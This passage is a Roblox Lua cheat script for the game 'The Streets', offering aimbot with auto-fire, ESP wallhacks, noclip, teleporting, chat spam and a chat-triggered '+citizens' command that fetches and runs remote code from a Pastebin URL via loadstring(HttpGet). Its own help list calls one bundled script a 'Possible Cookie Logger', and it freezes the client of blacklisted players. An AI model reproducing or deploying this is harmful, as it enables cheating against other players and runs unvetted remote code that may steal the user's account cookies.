	CmdBarFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CmdBarFrame.BackgroundTransparency = 0.8
	CmdBarFrame.Size = UDim2.new(0,197,0,41)
	CmdBarFrame.Position = UDim2.new(1.5,0,1.5,0)
	CmdBarFrame.AnchorPoint = Vector2.new(0.5,0.5)

	CmdBarTextBox.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CmdBarTextBox.BackgroundTransparency = 0.4
	CmdBarTextBox.BorderColor3 = Color3.fromRGB(170,0,0)
	CmdBarTextBox.BorderSizePixel = 2
	CmdBarTextBox.Position = UDim2.new(0,0,-0.8,0)
	CmdBarTextBox.Size = UDim2.new(0,199,0,41)
	CmdBarTextBox.Font = Enum.Font.SciFi
	CmdBarTextBox.TextColor3 = Color3.fromRGB(255,255,255)
	CmdBarTextBox.TextSize = 15
	CmdBarTextBox.TextWrapped = true
	CmdBarTextBox.ClearTextOnFocus = true 
	
	CmdBarImageLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CmdBarImageLabel.Size = UDim2.new(0,199,0,145)
	CmdBarImageLabel.Image = CmdBarImage
	
	-- Values GUI -- 
	
	ValuesFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
	ValuesFrame.BackgroundTransparency = 1
	ValuesFrame.Position = UDim2.new(0.15,0,1,0)
	ValuesFrame.AnchorPoint = Vector2.new(0,1)
	ValuesFrame.Size = UDim2.new(0,160,0,160)
	
	ValuesTextLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
	ValuesTextLabel.BackgroundTransparency = 0.6
	ValuesTextLabel.BorderColor3 = Color3.fromRGB(170,0,0)
	ValuesTextLabel.Position = UDim2.new(0,0,0,0)
	ValuesTextLabel.Size = UDim2.new(0,160,0,160)
	ValuesTextLabel.Font = Enum.Font.Code
	ValuesTextLabel.TextColor3 = Color3.fromRGB(255,255,255)
	ValuesTextLabel.TextSize = 14
	ValuesTextLabel.TextWrapped = true
	ValuesTextLabel.TextYAlignment = Enum.TextYAlignment.Top
	
	-- Hotkeys GUI -- 
	
	HotkeysFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
	HotkeysFrame.BackgroundTransparency = 1
	HotkeysFrame.Position = UDim2.new(0.8,0,1,0)
	HotkeysFrame.AnchorPoint = Vector2.new(1,1)
	HotkeysFrame.Size = UDim2.new(0,160,0,160)

	HotkeysTextLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
	HotkeysTextLabel.BackgroundTransparency = 0.6
	HotkeysTextLabel.BorderColor3 = Color3.fromRGB(170,0,0)
	HotkeysTextLabel.Position = UDim2.new(0,0,0,0)
	HotkeysTextLabel.Text = "Open Command Bar: '\nGunStomp: E"
	HotkeysTextLabel.Size = UDim2.new(0,160,0,160)
	HotkeysTextLabel.Font = Enum.Font.Code
	HotkeysTextLabel.TextColor3 = Color3.fromRGB(255,255,255)
	HotkeysTextLabel.TextSize = 14
	HotkeysTextLabel.TextWrapped = true
	HotkeysTextLabel.TextYAlignment = Enum.TextYAlignment.Top
	
	-- Damage Indicator -- 
	
	DmgIndicator.BackgroundColor3 = Color3.fromRGB(0,0,0)
	DmgIndicator.BackgroundTransparency = 0.7
	DmgIndicator.BorderSizePixel = 3
	DmgIndicator.Position = UDim2.new(0,0,1,0)
	DmgIndicator.Size = UDim2.new(0,385,0,50)
	DmgIndicator.Font = Enum.Font.Code
	DmgIndicator.TextColor3 = Color3.fromRGB(184,0,3)
	DmgIndicator.TextScaled = true
	DmgIndicator.TextSize = 30
	DmgIndicator.TextWrapped = true
	DmgIndicator.Visible = false

	-- Hotkeys GUI -- 

	KeysFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
	KeysFrame.BackgroundTransparency = 0.6
	KeysFrame.BorderColor3 = Color3.fromRGB(170,0,0)
	KeysFrame.BorderSizePixel = 0
	KeysFrame.Position = UDim2.new(0.5,0,0.5,0)
	KeysFrame.AnchorPoint = Vector2.new(0.5,0.5)
	KeysFrame.Size = UDim2.new(0,218,0,154)
	KeysFrame.Visible = false 

	AnyCmdButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
	AnyCmdButton.BackgroundTransparency = 0.7
	AnyCmdButton.BorderColor3 = Color3.fromRGB(170,0,0)
	AnyCmdButton.Position = UDim2.new(0.17,0,0.43,0)
	AnyCmdButton.Size = UDim2.new(0,49,0,49)
	AnyCmdButton.Font = Enum.Font.SourceSans
	AnyCmdButton.TextColor3 = Color3.fromRGB(255,255,255)
	AnyCmdButton.TextSize = 13
	AnyCmdButton.TextWrapped = true
	AnyCmdButton.Text = "Type a command then click"
	
	KeysLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
	KeysLabel.BackgroundTransparency = 0.3
	KeysLabel.BorderColor3 = Color3.fromRGB(170,0,0)
	KeysLabel.Position = UDim2.new(0.004,0,-0.3,0)
	KeysLabel.Size = UDim2.new(0,217,0,50)
	KeysLabel.Font = Enum.Font.SciFi
	KeysLabel.Text = "Keys GUI"
	KeysLabel.TextColor3 = Color3.fromRGB(214,0,0)
	KeysLabel.TextSize = 50
	
	CmdBarKeyLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CmdBarKeyLabel.BackgroundTransparency = 0.6
	CmdBarKeyLabel.BorderColor3 = Color3.fromRGB(0,0,127)
	CmdBarKeyLabel.Position = UDim2.new(0.6,0,0.07,0)
	CmdBarKeyLabel.Size = UDim2.new(0,50,0,44)
	CmdBarKeyLabel.Font = Enum.Font.Fantasy
	CmdBarKeyLabel.Text = "CmdBar Key"
	CmdBarKeyLabel.TextColor3 = Color3.fromRGB(255,255,255)
	CmdBarKeyLabel.TextSize = 11
	CmdBarKeyLabel.TextWrapped = true
	
	CmdBarKeyButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CmdBarKeyButton.BackgroundTransparency = 0.7
	CmdBarKeyButton.BorderColor3 = Color3.fromRGB(170,0,0)
	CmdBarKeyButton.Position = UDim2.new(0.6,0,0.43,0)
	CmdBarKeyButton.Size = UDim2.new(0,49,0,49)
	CmdBarKeyButton.Font = Enum.Font.SourceSans
	CmdBarKeyButton.Text = "Click then press a key"
	CmdBarKeyButton.TextColor3 = Color3.fromRGB(255,255,255)
	CmdBarKeyButton.TextSize = 13
	CmdBarKeyButton.TextWrapped = true
	
	AnyCmdTextBox.BackgroundColor3 = Color3.fromRGB(0,0,0)
	AnyCmdTextBox.BackgroundTransparency = 0.6
	AnyCmdTextBox.BorderColor3 = Color3.fromRGB(0,0,127)
	AnyCmdTextBox.Position = UDim2.new(0.17,0,0.07,0)
	AnyCmdTextBox.Size = UDim2.new(0,50,0,44)
	AnyCmdTextBox.Font = Enum.Font.Fantasy
	AnyCmdTextBox.PlaceholderColor3 = Color3.fromRGB(255,255,255)
	AnyCmdTextBox.PlaceholderText = "CmdToSet"
	AnyCmdTextBox.Text = ""
	AnyCmdTextBox.TextColor3 = Color3.fromRGB(255,255,255)
	AnyCmdTextBox.TextSize = 11
	AnyCmdTextBox.TextWrapped = true
	dragGUI(KeysFrame,KeysFrame)
end))

--[[ End ]] -- 

--[[ Loops ]] -- 

coroutine.resume(coroutine.create(function()
	local FileDir,isFolder,makeFolder = syn_io_listdir or list_files,syn_io_isfolder or isfolder,syn_io_makefolder or makefolder
	if FileDir and isFolder and makeFolder then 
		if not isFolder'CyAdminPlugins' then 
			makeFolder('CyAdminPlugins')
		end 
		for _,v in pairs(FileDir'CyAdminPlugins') do 
			local WorkingFile = loadfile(v)
			if not WorkingFile then
				ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("There was a syntax error (sadly can\'t output it as loadfile is gay)","All")
			else 
				local Work,Error = pcall(WorkingFile) 
				if not Work then 
					ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Runtime Error"..Error,"All")
				end
			end
		end
	end 
	CmdsLabel.Text = "Commands | Total Commands: "..#Commands
	for i = 1,#Commands do 
		local Command = Commands[i]
		local Name,Args,Alias,Help = Command.Name,Command.Args,Command.Alias,Command.Help
		createCmd(UDim2.new(0.0008,0,0.002,-35 + (i * 29)),Name,Help)
		coroutine.resume(coroutine.create(function() createCommandBarCmd(Name,Args) end))
		coroutine.resume(coroutine.create(function()
			for i = 1,#Alias do
				createCommandBarCmd("[Alias] "..Alias[i],Args)
			end
		end))
	end
	while wait() do
		local Character = GetChar()
		coroutine.resume(coroutine.create(function()
			if Character and Character:FindFirstChildOfClass'Humanoid'then 
				if workspace.Gravity < NormalGravity then 
					if game.PlaceId == 455366377 and not Character:FindFirstChild'HumanoidRootPart' then 
						Character.Humanoid:ChangeState(3)
						Character.Humanoid.PlatformStand = false
						wait(0.2)
					end
					Character.Humanoid:ChangeState(8)
				end
				if game.PlaceId == 455366377 then 
					if Character.Humanoid.HipHeight > 0 or AirwalkOn and not Flying then 
						Character.Humanoid:ChangeState(3)
						Character.Humanoid.PlatformStand = false
						RunService.RenderStepped:Wait()
						Character.Humanoid:ChangeState(8)
						wait(2)
					end
				end
			end 
		end))
		local Tool = Character:FindFirstChildOfClass'Tool'
		if AimbotAutoShoot and AimlockTarget and Tool and Tool:FindFirstChild('Clips',true) and AimlockTarget:FindFirstChildOfClass'Humanoid' and AimlockTarget.Humanoid.Health > 0 and not AimlockTarget:FindFirstChildOfClass'ForceField' then
			if not BehindAWall(AimlockTarget) and HasItem(Players:GetPlayerFromCharacter(AimlockTarget),"Bone") ~= "Yes" then
				if AimlockTarget:FindFirstChild'Head' and Character:FindFirstChild'Head' and (AimlockTarget.Head.Position - Character.Head.Position).magnitude <= EstimatedGunRanges[Tool.Name] then 
					if game.PlaceId == 455366377 then
						LP.Backpack.Input:FireServer("m1",{
							['mousehit'] = AimbotToCFrame();
							['shift'] = UserInput:IsKeyDown(Enum.KeyCode.LeftShift);
							['velo'] = Character.Head.Velocity.magnitude;
						})
					else 
						Tool.Fire:FireServer(AimbotToCFrame())
					end
				end 
			end 
		end
		if Character:FindFirstChildOfClass'Humanoid' then 
			if Tool and Tool:FindFirstChild'Ammo' then 
				ValuesTextLabel.Text = "Health: "..math.floor(Character.Humanoid.Health).."\nCurrent WalkSpeed: "..math.floor(Character.Humanoid.WalkSpeed).."\nSprinting Speed: "..SprintSpeed.."\nCrouching Speed: "..CrouchSpeed.."\nBlink Speed: "..BlinkSpeed.."\nJumpPower: "..Character.Humanoid.JumpPower.."\nNoclipping: "..tostring(Noclip).."\nAimlocking: "..tostring(Aimlock).."\nAimlock Target: "..tostring(AimlockTarget).."\n"..Tool.Name.." Ammo&Clips: "..Tool.Ammo.Value.."/"..Tool.Clips.Value
			else 
				ValuesTextLabel.Text = "Health: "..math.floor(Character.Humanoid.Health).."\nCurrent WalkSpeed: "..math.floor(Character.Humanoid.WalkSpeed).."\nSprinting Speed: "..SprintSpeed.."\nCrouching Speed: "..CrouchSpeed.."\nBlink Speed: "..BlinkSpeed.."\nJumpPower: "..Character.Humanoid.JumpPower.."\nNoclipping: "..tostring(Noclip).."\nAimlocking: "..tostring(Aimlock).."\nAimlock Target: "..tostring(AimlockTarget) 
			end
		end 
		if AimlockTarget and AimlockTarget:FindFirstChild'Torso' then
			if AimlockTargetPosition then 
				local Magnitude = (AimlockTargetPosition - AimlockTarget.Torso.Position).magnitude / AimbotVelocity
				if Magnitude > 1 then
					NewPredictionVelocity = Magnitude
				else
					NewPredictionVelocity = 5
				end
				AimlockTargetPosition = AimlockTarget.Torso.Position
			else
				AimlockTargetPosition = AimlockTarget.Torso.Position
			end				
		end
		if GravGunBodyPosition then 
			GravGunBodyPosition.Position = GravGunTool.Handle.Position + CFrame.new(GravGunTool.Handle.Position,Mouse.Hit.p).lookVector * GravGunDistance
		end
		if RainbowFrame.Visible then 
			RainbowLabel.TextColor3 = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
		end
		if LP.Character then 
			local PartFound = Character:FindFirstChild'HumanoidRootPart' or Character:FindFirstChild'Torso'
			if PartFound and Blinking and KeyTable['Shift'] then 
				if KeyTable['W'] then 
					PartFound.CFrame = PartFound.CFrame * CFrame.new(0,0,-BlinkSpeed)
				end 
				if KeyTable['A'] then 
					PartFound.CFrame = PartFound.CFrame * CFrame.new(-BlinkSpeed,0,0)
				end
				if KeyTable['S'] then 
					PartFound.CFrame = PartFound.CFrame * CFrame.new(0,0,BlinkSpeed)
				end
				if KeyTable['D'] then 
					PartFound.CFrame = PartFound.CFrame * CFrame.new(BlinkSpeed,0,0)
				end
			end
		end
		for i = 1,#EspTable do
			local Table = EspTable[i]
			local Player = Table['Player']
	        if Player and Player.Character then
				local Head,Torso = Player.Character:FindFirstChild'Head',Player.Character:FindFirstChild'HumanoidRootPart' or Player.Character:FindFirstChild'Torso'
	            if Head and Torso and Character:FindFirstChild'Head' then
	                local Pos,OnScreen = WorldToViewportPoint(Head.Position)
	                local SizeForBox = Vector3.new(2,3,0) * ((Head.Size.Y / 2) * 2)
	                local TopLeft = WorldToViewportPoint((Torso.CFrame * CFrame.new(SizeForBox.X,SizeForBox.Y,0)).p)
	                local TopRight = WorldToViewportPoint((Torso.CFrame * CFrame.new(-SizeForBox.X,SizeForBox.Y,0)).p)
	                local BottomLeft = WorldToViewportPoint((Torso.CFrame * CFrame.new(SizeForBox.X,-SizeForBox.Y,0)).p)
					local BottomRight = WorldToViewportPoint((Torso.CFrame * CFrame.new(-SizeForBox.X,-SizeForBox.Y,0)).p)
					ShowOrHideEsp(Table,OnScreen,Player)
					local User = AdminUserTable[Player] and "Yes" or "No"
					Table['Text'].Text = Player.Name.." | Health: "..checkHp(Player.Character).." | KO'ed: "..HasItem(Player,"Bone").." | Pos: "..math.floor((Character.Head.Position - Head.Position).magnitude).."\nHas Glock: "..HasItem(Player,"Glock").." | Shotty: "..HasItem(Player,"Shotty").." | Vest: "..HasItem(Player,"BulletResist").."\nCyAdmin User: "..User
		            Table['Text'].Position = Vector2.new(Pos.X,Pos.Y) + Vector2.new(0,10)
		            Table['Box'][1].From = Vector2.new(TopLeft.X,TopLeft.Y)
		            Table['Box'][1].To = Vector2.new(TopRight.X,TopRight.Y)
		            Table['Box'][2].From = Vector2.new(TopRight.X,TopRight.Y)
		            Table['Box'][2].To = Vector2.new(BottomRight.X,BottomRight.Y)
		            Table['Box'][3].From = Vector2.new(BottomLeft.X,BottomLeft.Y)
					Table['Box'][3].To = Vector2.new(TopLeft.X,TopLeft.Y)
            	end 
        	end 
    	end 
	end
end))

coroutine.resume(coroutine.create(function()
	while wait(1) do
		if CmdBarKey == "Quote" then 
			HotkeysTextLabel.Text = "Open Command Bar: '".."\nGunStomp: E"
		else
			HotkeysTextLabel.Text = "Open Command Bar: "..CmdBarKey.."\nGunStomp: E"
		end
		for i,v in pairs(Keys) do HotkeysTextLabel.Text = HotkeysTextLabel.Text.."\n"..v:match'^[%w%s]+'..": "..v:match'[%a%d]+$' end 
		if ExploiterDetectionOn then 
			local PlayerT = Players:GetPlayers()
			for i = 1,#PlayerT do 
				local Player = PlayerT[i]
				if Player ~= LP and Player.Character and Player.Character:FindFirstChild'Head' then 
					if Player.Character:FindFirstChild'Humanoid' and Player.Character:findFirstChild'Right Arm' then 
						if ExploitDetectionPlayerTablePositions[Player.Name] then
							local Pos1 = Player.Character.Head.Velocity
							local Pos2 = ExploitDetectionPlayerTablePositions[Player.Name]
							if not Player.Character.Head:FindFirstChildOfClass'BillboardGui' and Player.Character.Humanoid.Health > 0 and not Player.Character:FindFirstChild('Bone',true) and not Player.Character:FindFirstChildOfClass'ForceField' then 
								if (Vector3.new(Pos1.X,0,0) - Vector3.new(Pos2.X,0,0)).magnitude >= 85 or (Vector3.new(0,0,Pos1.Z) - Vector3.new(0,0,Pos2.Z)).magnitude >= 85 then
									Esp(Player.Character.Head,"Exploiter: "..Player.Name.." Reason: moved too fast",Color3.fromRGB(255,255,255))
									ExploitDetectionPlayerTablePositions[Player.Name] = Player.Character.Head.Velocity
								else
									ExploitDetectionPlayerTablePositions[Player.Name] = Player.Character.Head.Velocity
								end
							end
						else
							ExploitDetectionPlayerTablePositions[Player.Name] = Player.Character.Head.Velocity
						end
					else
						if not Player.Character.Head:FindFirstChildOfClass'BillboardGui' and Player.Character:FindFirstChildOfClass'Tool' then
							Esp(Player.character.Head,"Exploiter: "..Player.Name.." Reason: Feloop/Anti Feloop",Color3.fromRGB(255,255,255))
						end 
					end
				end
			end
		end
		if #WireFrameTable > 0 then 
			for i,v in pairs(WireFrameTable) do 
				local Pos,OnScreen = workspace.CurrentCamera:WorldToViewportPoint(v[2].Position)
				v[1].Visible = OnScreen
			end 
		end 
	end
end))

coroutine.resume(coroutine.create(function()
	for i,Player in pairs(Players:GetPlayers()) do
		local Backdoor = BackDoorTablePlayers[Player.UserId]
		local Blacklist = BlacklistTable[Player.UserId]
		if (Blacklist or Player:IsInGroup(5152759) or string.find(Player.Name:lower(),"lynx")) and Player.character and Player.Character:FindFirstChild'Head' then
			Esp(Player.Character.Head,Player.Name,Color3.fromRGB(102,51,0),true)
			Player.CharacterAdded:Connect(function(C)
				local Head = C:WaitForChild'Head'
				if Head then 
					Esp(Head,Player.Name,Color3.fromRGB(102,51,0),true)
				end 
			end)
		end 
		if Backdoor and Player.Character and Player.Character:FindFirstChild'Head' then
			Player.Chatted:Connect(function(Chat) BackdoorCheck(Player,Chat) end)
			Esp(Player.Character.Head,Backdoor['Name'],Backdoor['Colour'])
			initalizeBackdoorPart2(Player,Backdoor['Colour'])
			Player.CharacterAdded:Connect(function(C)
				local Head = C:WaitForChild'Head'
				if Head then
					initalizeBackdoorPart2(Player,Backdoor['Colour'])
					Esp(Head,Backdoor['Name'],Backdoor['Colour'])
				end
			end)
		end
		local Chatted;Chatted = Player.Chatted:Connect(function(Chat)
		local User = IsAUser(Player,Chat)
			if User then 
				Chatted:Disconnect()
			end
		end)
	end
	coroutine.resume(coroutine.create(function()
		while wait(SpamDelay) do 
			if Spamming then 
				ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SpamMessage,"All")
			end 
		end
	end))
	while wait(Rainbowdelay) do 
		if RainbowHats and LP.Backpack:FindFirstChild'Stank' then
			if RainbowHats == "All" then 
				local HatTable = LP.PlayerGui.HUD.Clan.Group.Reps:GetChildren()
				LP.Backpack.Stank:FireServer("rep",HatTable[math.random(1,#HatTable)])
			end 
			local ColourTable = LP.PlayerGui.HUD.Clan.Group.cs:GetChildren()
			LP.Backpack.Stank:FireServer("color",ColourTable[math.random(1,#ColourTable)])
		end
	end
end))

-- [[ End ]] --

notif("Cyrus' Streets admin","took " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: nXcZH36)",10,"rbxassetid://2474242690") -- string.format remains superior - Slays.
notif("Newest Update","Added autotarget feloop",10,nil)

if LP:IsInGroup(5152759) or string.find(LP.Name:lower(),"lynx") or BlacklistTable[LP.UserId] then
	while true do end
end
end
end)
---------------------------------------
 game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "+citizens") then
				
loadstring(game:HttpGet("https://pastebin.com/raw/WVS8kfme", true))()
end
end)
---------

print([[
         Cmds
< - Console Cmds  By Dollar. - >
< - Smoked Script By Dollar. - >
-
F - Fly.
Noclip - X
H - Hipheight.
Q - Lock Onto Player.
E- Shoot Locked Player.
C - Reset Character.
Right Click - Unlock Door.
G - Ws 90. (Nvm)
-
+hotkeys - Shows Hotkeys In Cool White Gui.
+citizens - Opens Up Best Script.
+aidez - Opens Up Mega Combat v3. Known As Aidez.
+korx - Trash Script But Has RunSpeed. Code Is "keithiscool"
+psycho - Opens Up Decent Most Legit Script.
+cyrus - Opens Up Best Free Script. Possible Cookie Logger.
+wc - Checks If Smoked Is Executed And Working.
+wsgui - Opens Up Walkspeed And JumpPower GUI.
+ws 90 - Walkspeed 90 (set by default)
+fov 100 - 100 Feild Of View. 
+bluesky - Always Night And Blue Sky.
+unbluesky - Normal Color
+nodoors - Removes All Doors.
+gunanims - Glock And Shotty Pawel Gun Anims.
+rejoin - Rejoins The Game.
+glock <plr> - Glock Triggerbots Plr.
+shotty <plr> - Shotty Triggerbots Plr.
+streets - Teleports You To Normal The Steets.
+view <plr> - Stalks Or Locks Plr.
+unview <plr> - Unstalks / Unlocks Plr.
+esp <plr> - Trace Or Esps Player.
+stam - Buys Greenbull In Normal TS.
+bypass - Tpbypass.
+unbypass - UnTpbypass.
+fov 70 - Sets Feild of View Back To Normal.
+godmode - Makes You Go Into Fucking God Mode.
+aim <plr> - Aimbots Target.
+spam - Spams Messages In Chat.
+antife - Anti Feloop / anti naked guy lol
-
+flyspeed <num>
+camlock <plr>
+sprintspeed <num>
+walkspeed <num> <already seperate exe>
+cmds
+feloop <plr>
+antife
+stalk <plr>
+camlocktype <Torso/Head>
+dupe
+lowerhh
< - More Coming Soon - >]])
 
game:GetService('RunService').Stepped:connect(function()
 
    if Selecting == true then
	if mouse.Target then
	    if mouse.Target.Parent:IsA("Model") and game.Players:FindFirstChild(mouse.Target.Parent.Name) then
		Target.Text = mouse.Target.Parent.Name
		targetee = game.Players:FindFirstChild(mouse.Target.Parent.Name)
	    end
	end
    end
end)
